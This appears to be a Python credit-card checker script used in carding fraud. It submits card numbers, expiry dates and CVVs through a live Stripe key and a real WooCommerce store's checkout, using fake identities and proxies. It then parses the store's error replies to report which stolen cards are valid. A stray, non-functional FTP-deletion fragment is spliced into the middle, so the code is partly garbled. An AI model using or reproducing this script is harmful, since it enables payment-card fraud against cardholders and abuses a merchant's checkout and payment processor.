import requests,random 
letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
email = ''
for _ in range(10):
    letter = random.sample(letters,1)[0]
    email += letter

email += '@gmail.com'

user = ''
for _ in range(7):
    letter = random.sample(letters,1)[0]
    user += letter



last = ''
for _ in range(7):
    letter = random.sample(letters,1)[0]
    last += letter


first = user 
name = user

import socket
import errno  

try:
    Deleting filename
    self.ftp.delete(filename)
    return True
except (error_reply, error_perm, error_temp):
    return False
except socket.error as error:
    if error.errno == errno.WSAECONNRESET:
        reconnect()
        retry_action()
    else:
        raise




def find_between(data, first, last):
  try:
    start = data.index(first) + len(first)
    end = data.index(last, start)
    return data[start:end]
  except ValueError:
    return None




def cc_check(cc,mes,ano,cvv,proxies):

    # print(requests.get("https://check.srfxdz.repl.co/",proxies=proxies).text)
    # exit()
    x = f"{cc}|{mes}|{ano}|{cvv}"
    url = "https://api.stripe.com/v1/sources"
    data = f"type=card&owner[name]=jon+jones&owner[address][line1]=125+n+end+rd&owner[address][state]=TX&owner[address][city]=dallas&owner[address][postal_code]=75206&owner[address][country]=US&owner[email]=gavsgsh%40gmail.com&owner[phone]=9082570072&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=d6861066-5fc9-4516-a8ab-1a07297211fc557f5f&muid=c16e54a3-e982-4ad2-9e17-b809d634c9b3d6894d&sid=56500f03-eaff-426e-bd99-199e28ae60cc75e2ca&payment_user_agent=stripe.js%2Ff87fa159b%3B+stripe-js-v3%2Ff87fa159b&time_on_page=33926&key=pk_live_iPNzeqcQSfXF4fm1pgBr3C4Z00WgVjVygY"

    try:
        req1 = requests.post(url,data).json()
        id = req1["id"]

    except:
        try:
            err = req1["error"]["decline_code"]
        except:
            err = req1["error"]["code"]
        else:
            err = req1
        print (f"<code>{x}</code> <b>{err}</b>\n\n")
        return (f"<code>{x}</code> <b>{err}</b>\n\n")
        
    
    head = {
    'authority':'www.thecodyallen.com',
    'method':'POST',
    'path':'/?wc-ajax=checkout&wcf_checkout_id=1238',
    'scheme':'https',
    'accept':'application/json, text/javascript, */*; q=0.01',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-US,en;q=0.9',
    'cache-control':'max-age=0',
    'content-length':'539',
    'content-type':'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie':'=https%3A%2F%2Fthecodyallen.com%2Ffunnel_step%2Fbook-checkout%2F; wp_woocommerce_session_a6897df11834e7b2987d4bfe43641b8f=t_6393253b3741bc30659663ae3f56ca%7C%7C1671860256%7C%7C1671856656%7C%7Ca3ed45c2e9fba9abede6820cd17d80a9; woocommerce_items_in_cart=1; wcf_active_checkout=1238; woocommerce_cart_hash=c04791a8b7bff3861d1c4b15e91213c2; tk_ai=iSWHAxoo%2F1nXTamycQ2Nb5qd; _ga_NQX2R3QZRF=GS1.1.1671687458.1.0.1671687458.0.0.0; tk_qs=; _ga=GA1.2.1232544030.1671687458; _gid=GA1.2.166978807.1671687458; _gat_gtag_UA_162054421_1=1; __gads=ID=d5faf41cb01fcb52-22ca6bb0add9003a:T=1671687458:RT=1671687458:S=ALNI_MZe2z837tbhjuHl9dz0Yl-u3WsHpQ; __gpi=UID=000008dd99e7598e:T=1671687458:RT=1671687458:S=ALNI_MY3xchlOpxDfgcgVr-kUJqLXlNohg; trc_cookie_storage=taboola%2520global%253Auser-id%3D9daa1fb4-2862-4546-8cab-ed926966afc6-tucta935f7f; __stripe_mid=c16e54a3-e982-4ad2-9e17-b809d634c9b3d6894d; __stripe_sid=56500f03-eaff-426e-bd99-199e28ae60cc75e2ca',
    'origin':'https://thecodyallen.com',
    'referer':'https://thecodyallen.com/funnel_step/book-checkout/',
    'sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'upgrade-insecure-requests':'1',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    }
    url2 = "https://thecodyallen.com/funnel_step/book-checkout/"
    data2 = f"billing_first_name=jon&billing_last_name=jones&billing_company=&billing_country=US&billing_address_1=125+n+end+rd&billing_address_2=&billing_city=dallas&billing_state=TX&billing_postcode=75206&billing_phone=9082570072&billing_email=gavsgsh%40gmail.com&order_comments=&_wcf_flow_id=1236&_wcf_checkout_id=1238&coupon_code=&payment_method=stripe&woocommerce-process-checkout-nonce=ba45a9cf8d&_wp_http_referer=%2Ffunnel_step%2Fbook-checkout%2F%3Fwc-ajax%3Dupdate_order_review%26wcf_checkout_id%3D1238&stripe_source=src_1MHhTrA7MhUzEeN7Xx82zDF7"
    try:
        req2 = requests.post(url=url2,data=data2,headers=head,proxies=proxies)
    except Exception as e:
        print (f"<code>{x}</code> {e}\n\n")
        return (f"<code>{x}</code> {e}\n\n")

    stripe = find_between(req2.text, 'class="pmpro_message pmpro_error">', '</')
    try:   
        resp = stripe.split(".")[1]
        print(f"<code>{x}</code> <b>{resp}</b>\n\n")
        return (f"<code>{x}</code> <b>{resp}</b>\n\n")
    except:
        print(f"<code>{x}</code> <b>{resp}</b>\n\n")
        return (f"<code>{x}</code> <b>{resp}</b>\n\n")



        
